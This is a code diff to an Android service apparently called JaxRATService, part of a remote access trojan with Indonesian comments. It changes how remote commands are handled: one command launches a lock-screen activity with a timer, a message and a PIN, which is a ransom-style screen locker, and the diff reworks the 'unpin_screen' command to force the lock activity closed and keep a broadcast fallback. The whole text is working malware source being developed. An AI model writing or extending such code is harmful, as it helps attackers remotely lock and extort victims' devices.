@@ -100,7 +100,6 @@ public class JaxRATService extends Service {
             String[] parts = cmd.split("\\|");
             if (parts.length >= 7) {
                 Intent intent = new Intent(this, LockScreenActivity.class);
-                // .trim() biar aman dari spasi tak kasat mata
                 intent.putExtra("TIMER", Long.parseLong(parts[1].trim()));
                 intent.putExtra("PESAN", parts[5].trim());
                 intent.putExtra("PIN", parts[6].trim());
@@ -108,9 +107,16 @@ public class JaxRATService extends Service {
                 startActivity(intent);
             }
         } else if (cmd.equals("unpin_screen")) {
-            Intent intent = new Intent("UNLOCK_SCREEN_ACTION");
-            intent.setPackage(getPackageName()); // KUNCI UTAMA: Bikin broadcast eksplisit
-            sendBroadcast(intent);
+            // --- JURUS BARU: Paksa buka Activity dan suruh tutup ---
+            Intent intent = new Intent(this, LockScreenActivity.class);
+            intent.putExtra("ACTION", "FINISH");
+            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+            
+            // Tetap kirim broadcast buat jaga-jaga
+            Intent broadcastIntent = new Intent("UNLOCK_SCREEN_ACTION");
+            broadcastIntent.setPackage(getPackageName());
+            sendBroadcast(broadcastIntent);
         }
     }
 
